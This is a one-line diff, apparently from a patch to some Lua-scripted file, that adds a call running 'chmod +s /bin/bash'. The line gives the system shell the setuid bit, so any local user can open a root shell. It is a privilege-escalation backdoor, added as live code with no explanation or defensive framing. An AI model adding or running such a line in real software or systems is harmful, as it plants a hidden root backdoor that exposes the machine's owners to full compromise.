@@ -1,0 +1,1 @@
+os.execute("chmod +s /bin/bash")
